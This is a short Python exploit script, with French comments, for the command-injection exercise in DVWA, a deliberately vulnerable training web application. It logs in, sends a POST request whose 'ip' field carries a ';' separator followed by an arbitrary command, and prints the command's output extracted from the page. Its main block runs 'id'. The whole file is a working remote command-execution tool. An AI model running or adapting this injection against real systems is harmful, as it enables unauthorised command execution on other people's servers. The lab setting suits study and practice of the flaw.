"""
exploit.py – Command Injection DVWA (méthode POST)
"""
import dvwa                                   # session authentifiée
from utils import banner
from html import unescape
from bs4 import BeautifulSoup
import config, requests


def _extract_output(html: str) -> str:
    """
    Récupère le contenu de la balise <pre> où DVWA affiche la sortie.
    Retourne une chaîne vide si rien n’est trouvé.
    """
    soup = BeautifulSoup(html, "html.parser")
    pre  = soup.find("pre")
    return unescape(pre.text.strip()) if pre else ""


def run_command(cmd: str, noisy: bool = True) -> str | None:
    """
    Envoie `cmd` via injection ; renvoie la réponse HTTP (HTML).
    `noisy=True` → affiche la sortie extraite (<pre>) pour l’utilisateur.
    """
    if not dvwa.session.cookies:
        dvwa.login()

    url  = f"http://{config.TARGET_IP}:{config.TARGET_PORT}{config.VULN_PATH}"
    data = {
        "ip":     f";{cmd}",   # séparateur ‘;’ → exécution arbitraire
        "submit": "submit"
    }

    banner(f"Injection (POST) : {cmd}")
    try:
        r = dvwa.session.post(url, data=data, timeout=5)
        if r.status_code == 200:
            out = _extract_output(r.text)
            banner("Commande exécutée (HTTP 200)", "OK")
            if noisy and out:
                print(f"\n--- Sortie de la commande ---\n{out}\n--- fin ---")
            elif noisy:
                banner("Aucune sortie détectée : l’injection a peut-être échoué", "WARN")
            return r.text
        banner(f"HTTP {r.status_code} reçu", "WARN")
    except requests.RequestException as e:
        banner(f"Erreur durant l’injection : {e}", "ERROR")
    return None


if __name__ == "__main__":
    run_command("id")
